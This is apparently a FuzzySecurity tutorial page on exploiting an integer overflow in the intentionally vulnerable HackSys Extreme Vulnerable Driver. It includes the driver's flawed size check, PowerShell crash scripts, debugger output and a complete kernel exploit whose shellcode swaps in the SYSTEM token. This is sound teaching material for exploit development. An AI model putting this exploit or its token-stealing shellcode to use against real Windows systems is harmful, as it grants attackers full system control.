@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Windows ExploitDev: Part 14</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+    
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../../js/shCore.js"></script>
+	<script type="text/javascript" src="../../js/shBrushCpp.js"></script>
+	<script type="text/javascript" src="../../js/shBrushPowerShell.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../../index.html">Home</a>
+            </li>
+            <li><a href="../../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../../coding.html">Scripting</a>
+            </li>
+            <li><a href="../../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../../links.html">Links</a>
+            </li>
+            <li><a href="../../patreon.html">Patreon</a></li><li><a href="../../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Kernel Exploitation: Integer Overflow</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Part 14: Kernel Exploitation -> Integer Overflow<span class="line"></span></h2>
+        <p>Hola, and welcome back to part 14 of the Windows exploit development tutorial series. Today we have another post on pwning <a href="https://twitter.com/HackSysTeam">@HackSysTeam's</a> extreme vulnerable driver. This time we will take a look at the integer overflow; barring the GS stack overflow (we will cover this later) and the type confusion (too easy to cover but exploit on <a href="https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn/blob/master/Kernel_TypeConfusion.ps1">GitHub</a>) this will be the last of the easily exploitable vulns! For more details on setting up the debugging environment see <a href="http://www.fuzzysecurity.com/tutorials/expDev/14.html">part 10</a>.<br /><br />
+      
+      <span style="color: #ffffff;"><strong>Resources:</strong></span><br />
+      + HackSysExtremeVulnerableDriver (hacksysteam) - <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">here</a></p><br />
+	  
+<div class="fourteen columns bottom">
+<h2 class="title">Recon the challenge<span class="line"></span></h2>
+<p>Let's have a look at part of the vulnerable function in question (<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/Source/IntegerOverflow.c">here</a>).</p><br />
+	  
+    <div class="main_wrap_support">
+<pre class="brush: c;gutter:false;auto-links: false;;">
+NTSTATUS TriggerIntegerOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
+    ULONG Count = 0;
+    NTSTATUS Status = STATUS_SUCCESS;
+    ULONG BufferTerminator = 0xBAD0B0B0;
+    ULONG KernelBuffer[BUFFER_SIZE] = {0};
+    SIZE_T TerminatorSize = sizeof(BufferTerminator);
+
+    PAGED_CODE();
+
+    __try {
+        // Verify if the buffer resides in user mode
+        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));
+
+        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
+        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
+        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
+        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));
+
+#ifdef SECURE
+        // Secure Note: This is secure because the developer is not doing any arithmetic
+        // on the user supplied value. Instead, the developer is subtracting the size of
+        // ULONG i.e. 4 on x86 from the size of KernelBuffer. Hence, integer overflow will
+        // not occur and this check will not fail
+        if (Size > (sizeof(KernelBuffer) - TerminatorSize)) {
+            DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);
+
+            Status = STATUS_INVALID_BUFFER_SIZE;
+            return Status;
+        }
+#else
+        DbgPrint("[+] Triggering Integer Overflow\n");
+
+        // Vulnerability Note: This is a vanilla Integer Overflow vulnerability because if
+        // 'Size' is 0xFFFFFFFF and we do an addition with size of ULONG i.e. 4 on x86, the
+        // integer will wrap down and will finally cause this check to fail
+        if ((Size + TerminatorSize) > sizeof(KernelBuffer)) {
+            DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);
+
+            Status = STATUS_INVALID_BUFFER_SIZE;
+            return Status;
+        }
+#endif
+
+        // Perform the copy operation
+        while (Count &lt; (Size / sizeof(ULONG))) {
+            if (*(PULONG)UserBuffer != BufferTerminator) {
+                KernelBuffer[Count] = *(PULONG)UserBuffer;
+                UserBuffer = (PULONG)UserBuffer + 1;
+                Count++;
+            }
+            else {
+                break;
+            }
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}</pre>
+</div>
+    
+<p>&nbsp;</p>
+<p>The driver function compares the length of the user supplied buffer to the buffer allocated by the driver. However in the vulnerable version this check is performed as follows:</p>
+
+<p>&nbsp;</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>
+BufferTerminator = 0xBAD0B0B0
+InputBuffer.Size + BufferTerminator.Size > KernelAllocatedBuffer.Size</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>Obvious bug is obvious, the terminator size is 4 bytes so if we supply DeviceIoControl with a buffer size which is between 0xfffffffc and 0xffffffff the driver will add 4 to the integer causing the value to loop round on itself and pass the check! We can do something similar in the PowerShell console to illustrate the issue.</p>
+
+<p>&nbsp;</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>
+PS C:\Users\b33f> 0xfffffffc+4
+0
+PS C:\Users\b33f> 0xffffffff+4
+3</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>The IOCTL for this function is 0x222027. To see how the IOCTL can be identified, please check out <a href="http://www.fuzzysecurity.com/tutorials/expDev/14.html">part 10</a> and <a href="http://www.fuzzysecurity.com/tutorials/expDev/15.html">part 11</a> of this series. Let's quickly jump into IDA and have a look at the function. In the image below we can see the function prolog including the erroneous length check.</p>
+
+<p>&nbsp;</p>
+<img src="images/KernelIntOver_1.png">
+<p>&nbsp;</p>
+
+<p>After we pass this block we end up in a loop that copies over bytes from the user buffer to the kernel buffer. Notice the orange block below, the copy operation continues until the buffer terminating DWORD is encountered.</p>
+
+<p>&nbsp;</p>
+<img src="images/KernelIntOver_2.png">
+<p>&nbsp;</p>
+
+<p>Let's briefly feed the driver some expected values so we can make sure we are able to call the relevant function.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+}
+"@
+  
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+ 
+$Buffer = [Byte[]](0x41)*0x100 + [System.BitConverter]::GetBytes(0xbad0b0b0)
+echo "`n[>] Sending buffer.."
+echo "[+] Buffer length: $($Buffer.Length)"
+echo "[+] IOCTL: 0x222027`n"
+[EVD]::DeviceIoControl($hDevice, 0x222027, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/KernelIntOver_3.png">
+<p>&nbsp;</p>
+
+<p>Perfect, as expected. Now, lets try to BSOD the box by giving DeviceIoControl a size of 0xffffffff and sending a buffer which is larger than the one allocated by the driver (eg: 0x900).</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+}
+"@
+  
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+ 
+$Buffer = [Byte[]](0x41)*0x900 + [System.BitConverter]::GetBytes(0xbad0b0b0)
+$Size = 0xffffffff
+echo "`n[>] Sending buffer.."
+echo "[+] Buffer length: $($Buffer.Length)"
+echo "[+] IOCTL: 0x222027`n"
+[EVD]::DeviceIoControl($hDevice, 0x222027, $Buffer, $Size, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/KernelIntOver_4.png">
+<p>&nbsp;</p>
+
+<h2 class="title">Pwn all the things!<span class="line"></span></h2>
+<p><span style="color: #ffffff;"><strong>Return Pointer Overwrite</strong></span><br /><br />
+As we were able to see above, we smashed the exception handler. This is not entirely desirable, what we really want is to do is a precise overwrite in order to gain control of execution when the TriggerIntegerOverflow function exits.<br /><br />
+
+This is a task I leave to the diligent reader. For posterity, as I have been "inventing" primitives in PowerShell to do exploit development, the following can be used to create a pattern buffer.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+$Pattern_Create = ([system.Text.Encoding]::ASCII).GetBytes("Aa0Aa1Aa2Aa3Aa........")</pre>
+</div>
+    
+<p>To overwrite the function return value with 0x42424242, we can use the following buffer structure.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+$Buffer = [Byte[]](0x41)*0x828 + [Byte[]](0x42)*0x4 + [System.BitConverter]::GetBytes(0xbad0b0b0)
+$Size = 0xffffffff</pre>
+</div>
+
+<p><span style="color: #ffffff;"><strong>Shellcode</strong></span><br /><br />
+Similar to the kernel stack overflow we have to see how we should should fix up the shellcode epilogue to prevent a BSOD! First let's have a look at the normal work flow when we provide the driver function expected values. We will place a breakpoint on the TriggerIntegerOverflow return instruction.</p><br />
+
+<p>&nbsp;</p>
+<img src="images/KernelIntOver_5.png">
+<p>&nbsp;</p>
+
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>
+kd> bp 9528c9b4
+kd> g
+****** HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW ******
+[+] UserBuffer: 0x023CAAEC
+[+] UserBuffer Size: 0x108
+[+] KernelBuffer: 0xA46B72AC
+[+] KernelBuffer Size: 0x800
+[+] Triggering Integer Overflow
+Breakpoint 0 hit
+HackSysExtremeVulnerableDriver+0x49b4:
+9528c9b4 c20800     ret     8     &lt;-------[Stack]  a46b7ad4 <span style="color:#ff0000;">9528c9da HackSysExtremeVulnerableDriver+0x49da</span>
+                                                   a46b7ad8 023cabf0 
+                                                   a46b7adc 00000108 
+                                                   a46b7ae0 a46b7afc 
+                                                   a46b7ae4 <span style="color:#2B8156;">9528d0e6 HackSysExtremeVulnerableDriver+0x50e6</span>
+<span style="color:#ff0000;">HackSysExtremeVulnerableDriver+0x49da</span>:
+9528c9da 5d         pop     ebp   &lt;-------[Stack]  a46b7ae0 a46b7afc 
+                                                   a46b7ae4 <span style="color:#2B8156;">9528d0e6 HackSysExtremeVulnerableDriver+0x50e6</span>
+                                                   a46b7ae8 85edde80
+<span style="color:#ff0000;">HackSysExtremeVulnerableDriver+0x49db</span>:
+9528c9db c20800     ret     8     &lt;-------[Stack]  a46b7ae4 <span style="color:#2B8156;">9528d0e6 HackSysExtremeVulnerableDriver+0x50e6</span>
+                                                   a46b7ae8 85edde80 
+                                                   a46b7aec 85eddef0 
+                                                   a46b7af0 85396620 </pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>This seems to be practically identical to the stack overflow we did in <a href="http://www.fuzzysecurity.com/tutorials/expDev/14.html">part 10</a>. Let's check out the stack when we trigger the integer overflow.</p>
+
+<p>&nbsp;</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>
+****** HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW ******
+[+] UserBuffer: 0x0234FAA4
+[+] UserBuffer Size: 0xFFFFFFFF
+[+] KernelBuffer: 0x96F4F2AC
+[+] KernelBuffer Size: 0x800
+[+] Triggering Integer Overflow
+Breakpoint 0 hit
+HackSysExtremeVulnerableDriver+0x49b4:
+9528c9b4 c20800     ret     8     &lt;-------[Stack]  96f4fad4 42424242 
+                                                   96f4fad8 023502d0 
+                                                   96f4fadc ffffffff 
+                                                   96f4fae0 96f4fafc 
+                                                   96f4fae4 <span style="color:#2B8156;">9528d0e6 HackSysExtremeVulnerableDriver+0x50e6</span></pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>We can modify the shellcode epilogue in the following fashion to restore the missing instructions.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+$Shellcode = [Byte[]] @(
+    #---[Setup]
+    0x60,                               # pushad
+    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
+    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
+    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
+    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
+    #---[Copy System PID token]
+    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
+    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] &lt;-|
+    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
+    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
+    0x75, 0xED,                         # jnz                           ->|
+    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
+    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
+    #---[Recover]
+    0x61,                               # popad
+    0x31, 0xC0,                         # NTSTATUS -> STATUS_SUCCESS :p
+    0x5D,                               # pop ebp
+    0xC2, 0x08, 0x00                    # ret 8
+)</pre>
+</div>
+
+<h2 class="title">Game Over<span class="line"></span></h2>
+<p>That should do the trick, please refer to the full exploit below for more information.</p><br />
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);  
+
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(
+    	IntPtr lpAddress,
+    	uint dwSize,
+    	UInt32 flAllocationType,
+    	UInt32 flProtect);
+}
+"@
+
+# Compiled with Keystone-Engine
+# Hardcoded offsets for Win7 x86 SP1
+$Shellcode = [Byte[]] @(
+    #---[Setup]
+    0x60,                               # pushad
+    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
+    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
+    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
+    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
+    #---[Copy System PID token]
+    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
+    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] &lt;-|
+    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
+    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
+    0x75, 0xED,                         # jnz                           ->|
+    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
+    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
+    #---[Recover]
+    0x61,                               # popad
+    0x31, 0xC0,                         # NTSTATUS -> STATUS_SUCCESS :p
+    0x5D,                               # pop ebp
+    0xC2, 0x08, 0x00                    # ret 8
+)
+ 
+# Write shellcode to memory
+echo "`n[>] Allocating ring0 payload.."
+[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
+$EIP = [System.BitConverter]::GetBytes($Pointer.ToInt32())
+echo "[+] Payload size: $($Shellcode.Length)"
+echo "[+] Payload address: $("{0:X8}" -f $Pointer.ToInt32())"
+
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+
+$Buffer = [Byte[]](0x41)*0x828 + $EIP + [System.BitConverter]::GetBytes(0xbad0b0b0)
+$Size = 0xffffffff
+echo "`n[>] Sending buffer.."
+echo "[+] Buffer size: $($Buffer.Length)"
+echo "[+] Fake buffer size: $("{0:X}" -f $Size)"
+echo "[+] IOCTL: 0x222027`n"
+[EVD]::DeviceIoControl($hDevice, 0x222027, $Buffer, $Size, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/KernelIntOver_6.png">
+<p>&nbsp;</p>
+
+</div>
+    </div>
+</div>
+
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../../index.html">Home</a> |
+          <a href="../../tutorials.html">Tutorials</a> |
+          <a href="../../coding.html">Scripting</a> |
+          <a href="../../exploits.html">Exploits</a> |
+          <a href="../../links.html">Links</a> |
+          <a href="../../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
